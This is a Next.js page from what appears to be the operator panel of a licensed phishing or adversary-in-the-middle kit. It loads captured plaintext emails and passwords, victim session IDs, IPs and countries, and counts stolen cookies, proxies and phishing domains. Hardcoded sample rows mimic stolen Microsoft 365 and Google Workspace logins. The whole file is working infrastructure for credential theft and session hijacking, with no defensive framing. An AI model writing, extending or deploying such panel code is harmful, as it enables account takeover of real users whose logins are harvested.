import { count, desc, eq } from "drizzle-orm";
import { mainDb } from "@/lib/db";
import {
  clientCookies,
  clients,
  credentials,
  domains,
  licenses,
  proxies,
} from "@/lib/schema/main.schema";
import { ipLog } from "@/lib/schema/security.schema";
import { LogRow, OverviewClient } from "./OverviewClient";
import { requireSession } from "@/lib/auth";

export const dynamic = "force-dynamic";

const dummyRows: LogRow[] = [
  {
    id: "LOG-1001",
    email: "admin@example.com",
    password: "SecurePass!204",
    fullSessionId: "sess_4f8c9c8b2a394d7fb361ea445d91b21a",
    clientIp: "102.89.43.17",
    service: "Microsoft 365",
    country: "Nigeria",
    firstSeen: "May 24, 2026, 09:12 AM",
    lastSeen: "May 24, 2026, 09:41 AM",
    fullTimestamp: "2026-05-24T09:41:33.019Z",
  },
  {
    id: "LOG-1002",
    email: "ops.user@company.test",
    password: "Vault#7782",
    fullSessionId: "sess_b18d7a03ef71410ba10f50d14af70262",
    clientIp: "45.67.112.90",
    service: "Google Workspace",
    country: "United States",
    firstSeen: "May 24, 2026, 10:02 AM",
    lastSeen: "May 24, 2026, 10:09 AM",
    fullTimestamp: "2026-05-24T10:09:55.481Z",
  },
  {
    id: "LOG-1003",
    email: "finance.team@domain.test",
    password: "Ledger$901",
    fullSessionId: "sess_9d0a2e663b6f4e9a97ee0222ebc89e8e",
    clientIp: "197.210.64.22",
    service: "Custom Portal",
    country: "Ghana",
    firstSeen: "May 25, 2026, 01:22 PM",
    lastSeen: "May 25, 2026, 01:36 PM",
    fullTimestamp: "2026-05-25T13:36:14.771Z",
  },
];

export default async function OverviewPage() {
  const session = await requireSession();
  const [license] = await mainDb.select().from(licenses).where(eq(licenses.licenseId, session.licenseId)).limit(1);
  const credentialRows = await mainDb
    .select()
    .from(credentials)
    .orderBy(desc(credentials.timestamp))
    .limit(25);

  const rows = await Promise.all(
    credentialRows.map(async (credential, index): Promise<LogRow> => {
      const [client] = await mainDb
        .select()
        .from(clients)
        .where(eq(clients.sessionId, credential.sessionId))
        .limit(1);

      return {
        id: `LOG-${String(index + 1).padStart(4, "0")}`,
        email: credential.email,
        password: credential.password,
        fullSessionId: credential.sessionId,
        clientIp: client?.client_ip ?? "Unknown",
        service: "Captured Login",
        country: credential.country || "Unknown",
        firstSeen: client?.first_seen ? new Date(client.first_seen).toLocaleString() : "Unknown",
        lastSeen: client?.last_seen ? new Date(client.last_seen).toLocaleString() : "Unknown",
        fullTimestamp: credential.timestamp,
      };
    }),
  );

  const [[clientsCount], [credentialsCount], [cookiesCount], [proxiesCount], [domainsCount], [ipCount]] =
    await Promise.all([
      mainDb.select({ count: count() }).from(clients),
      mainDb.select({ count: count() }).from(credentials),
      mainDb.select({ count: count() }).from(clientCookies),
      mainDb.select({ count: count() }).from(proxies).where(eq(proxies.licenseId, session.licenseId)),
      mainDb.select({ count: count() }).from(domains).where(eq(domains.licenseId, session.licenseId)),
      mainDb.select({ count: count() }).from(ipLog),
    ]);

  return (
    <OverviewClient
      // initialRows={rows.length > 0 ? rows : dummyRows}
      initialRows={dummyRows}
      licenseId={session.licenseId}
      expiresAt={license?.expiresAt ?? new Date().toISOString()}
      stats={{
        clients: clientsCount?.count ?? 0,
        credentials: credentialsCount?.count ?? 0,
        cookies: cookiesCount?.count ?? 0,
        proxies: proxiesCount?.count ?? 0,
        domains: domainsCount?.count ?? 0,
        securityEvents: ipCount?.count ?? 0,
      }}
    />
  );
}
